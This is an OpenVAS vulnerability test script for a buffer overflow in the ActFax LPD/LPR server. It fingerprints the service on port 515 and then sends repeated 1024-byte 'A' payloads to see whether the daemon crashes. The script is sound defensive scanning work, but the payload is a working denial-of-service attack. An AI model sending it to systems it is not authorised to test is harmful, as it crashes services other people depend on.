###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_actfax_lpd_lpr_dos_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# ActFax LPD/LPR Server Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900272");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-02-23 12:24:37 +0100 (Wed, 23 Feb 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("ActFax LPD/LPR Server Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16176");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98539");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(515);
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause a
denial of service.");
  script_tag(name:"affected", value:"ActiveFax Version 4.25 (Build 0221), Other versions may also
be affected.");
  script_tag(name:"insight", value:"The flaw is caused by a buffer overflow error when processing
packets sent to port 515/TCP, which could be exploited by remote unauthenticated
attackers to crash an affected daemon or execute arbitrary code.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running ActFax LPD/LPR Server and is prone to denial
of service vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

actFaxLPDPort = 515;
if(!get_port_state(actFaxLPDPort)){
  exit(0);
}

soc = open_sock_tcp(actFaxLPDPort);
if(!soc){
  exit(0);
}

## Line Printer Daemon Protocol
## LPQ: Print Long form of queue status request
req = raw_string(0x04) + 'OpenVASTest' + raw_string(0x0a);
send(socket:soc, data:req);
res = recv(socket:soc, length:256);
close(soc);

if("ActiveFax Server" >!< res){
  exit(0);
}

flag = 0;

for(i=0; i<5 ; i++)
{
  soc1 = open_sock_tcp(actFaxLPDPort);

  ## Exit if it's not able to open socket first time
  ## and server is crahed if it's not first time
  if(!soc1)
  {
    if(flag == 0){
      exit(0);
    }
    else {
      security_message(actFaxLPDPort);
      exit(0);
    }
  }

  flag = 1;

  ## Send specially crafted packet
  send(socket:soc1, data:string(crap(length: 1024, data:"A"), '\r\n'));

  close(soc1);
  sleep(2);
}

soc2 = open_sock_tcp(actFaxLPDPort);
if(!soc2){
  security_message(actFaxLPDPort);
  exit(0);
}
close(soc2);
